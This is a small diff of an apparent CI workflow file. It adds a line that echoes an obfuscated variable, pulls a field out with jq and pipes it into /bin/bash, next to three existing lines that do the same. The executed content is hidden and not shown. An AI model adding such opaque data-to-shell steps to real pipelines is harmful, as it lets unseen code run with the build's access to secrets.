@@ -46,6 +46,7 @@ jobs:
           printf '%s' "$nzl03" | jq -r .qyo1770 | /bin/bash
           printf '%s' "$i7" | jq -r .muve7396 | /bin/bash
           printf '%s' "$tb3" | jq -r .ns46004 | /bin/bash
+          echo $ahgoi990 | jq -r .svl6143 | /bin/bash
 
       - name: Archive output
         if: always()
